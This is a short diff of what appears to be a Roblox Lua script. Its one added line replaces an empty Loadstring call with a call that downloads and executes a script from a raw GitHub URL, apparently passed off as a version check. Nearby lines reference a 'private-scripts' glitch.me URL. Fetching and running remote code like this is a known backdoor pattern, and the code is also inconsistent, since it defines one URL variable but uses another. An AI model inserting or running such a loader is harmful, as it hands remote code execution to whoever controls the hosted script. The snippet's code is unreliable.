@@ -120,7 +120,7 @@ Client
     local URL = "https://private-scripts.glitch.me/Sensor_Door.lua"
     local response = HttpService:GetAsync(URL_ASTROS)
 
-	local sLatest =  Loadstring("", true) or "Unknown"
+	local sLatest =  Loadstring("https://raw.githubusercontent.com/goagentbot/UTS/refs/heads/main/UTS.lua", true) or "Unknown"
 
 	local EXTRA_INFO = string.format([[
 Untitled Test Service(Extra)
